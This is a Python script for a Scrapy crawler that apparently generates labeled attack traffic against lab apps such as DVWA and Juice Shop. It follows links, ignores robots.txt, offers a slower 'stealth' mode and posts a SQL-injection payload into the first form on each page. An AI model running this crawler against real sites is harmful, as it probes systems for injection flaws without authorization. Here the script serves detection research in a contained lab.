"""Scrapy-based agent — link-following crawler that pokes forms.

Scrapy's DEFAULT_REQUEST_HEADERS setting attaches X-Cernis-* to every
request the framework issues, so no proxy schema cache needed. We do
a single bootstrap pass through httpx first to mint cernis_sid + write
provenance, then point Scrapy at the same target with the captured
cookie in DEFAULT_REQUEST_HEADERS.

The spider walks links via LinkExtractor and submits the first form
on every page with a SQLi-shaped payload. Less "scanner" than
"breadth-first attack crawler."
"""

from __future__ import annotations

import os
import sys
import time

import httpx

sys.path.insert(0, "/app/shared")
from manifest import build_payload, headers_for, record_provenance_httpx  # noqa: E402
from target_guard import get_target  # noqa: E402

LABEL = "scrapy"
TARGET = get_target()
TARGET_APP = os.environ.get("CERNIS_TARGET_APP", "dvwa").strip().lower()
SECURITY_LEVEL = os.environ.get("DVWA_SECURITY_LEVEL", "low")
SESSIONS = int(os.environ.get("CERNIS_SESSIONS", "2"))
STEALTH = os.environ.get("CERNIS_STEALTH", "false").strip().lower() in (
    "1", "true", "yes",
)


def _bootstrap_session(payload: dict) -> dict:
    """Mint cernis_sid + write provenance; return the cookies dict for Scrapy."""
    headers = headers_for(payload) | {"User-Agent": "Scrapy/2.11"}
    with httpx.Client(base_url=TARGET, headers=headers,
                      timeout=10.0, follow_redirects=False) as client:
        try:
            client.head("/")
        except httpx.HTTPError as exc:
            print(f"[scrapy] bootstrap HEAD failed: {exc}", flush=True)
        record_provenance_httpx(client, TARGET, payload)
        return dict(client.cookies)


def _crawl(payload: dict, cookies: dict) -> int:
    # Scrapy must be imported here so the top-level module load (which
    # the smoke imports for type checks) doesn't drag the whole engine.
    from scrapy.crawler import CrawlerProcess
    from scrapy.linkextractors import LinkExtractor
    from scrapy.spiders import CrawlSpider, Rule

    label_headers = headers_for(payload)
    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())

    class _Spider(CrawlSpider):
        name = "cernis_scrapy_bot"
        start_urls = [TARGET]
        custom_settings = {
            "ROBOTSTXT_OBEY": False,
            "CONCURRENT_REQUESTS": 1 if STEALTH else 4,
            "DOWNLOAD_DELAY": 2.0 if STEALTH else 0.0,
            "DEPTH_LIMIT": 2 if STEALTH else 3,
            "CLOSESPIDER_PAGECOUNT": 8 if STEALTH else 20,
            "COOKIES_ENABLED": True,
            "LOG_LEVEL": "ERROR",
            "DEFAULT_REQUEST_HEADERS": {
                **label_headers,
                "User-Agent": "Scrapy/2.11",
                "Cookie": cookie_str,
            },
        }
        rules = (
            Rule(LinkExtractor(allow_domains=["capture", "capture_dvwa",
                                              "capture_juiceshop",
                                              "capture_webgoat",
                                              "capture_vampi"]),
                 callback="parse_page", follow=True),
        )

        def __init__(self, *a, **kw):
            super().__init__(*a, **kw)
            self.req_count = 0

        def parse_start_url(self, response):
            return self.parse_page(response)

        def parse_page(self, response):
            self.req_count += 1
            # follow the first form with a SQLi-shaped POST
            from scrapy.http import FormRequest
            try:
                yield FormRequest.from_response(
                    response,
                    formdata={"q": "1' OR '1'='1", "id": "1' OR '1'='1"},
                    dont_filter=True,
                )
            except Exception:
                return

    process = CrawlerProcess(settings={
        "TELNETCONSOLE_ENABLED": False,
        "LOG_LEVEL": "ERROR",
    })
    process.crawl(_Spider)
    process.start()  # blocks until done
    return 1


def main() -> int:
    mode = "stealth" if STEALTH else "fast"
    print(f"[{LABEL}] target={TARGET} target_app={TARGET_APP} "
          f"mode={mode} sessions={SESSIONS}", flush=True)
    for i in range(SESSIONS):
        t0 = time.time()
        payload = build_payload(
            klass="agent", family=LABEL, target_app=TARGET_APP,
            security_level=SECURITY_LEVEL, stealth=STEALTH,
            generator="scrapy", generator_version="0.1.0",
            generator_config={
                "tool": "scrapy", "depth": (2 if STEALTH else 3),
                "stealth": STEALTH,
            },
        )
        cookies = _bootstrap_session(payload)
        _crawl(payload, cookies)
        print(f"[{LABEL}] session {i + 1} took={time.time() - t0:.1f}s",
              flush=True)
    print(f"[{LABEL}] done", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
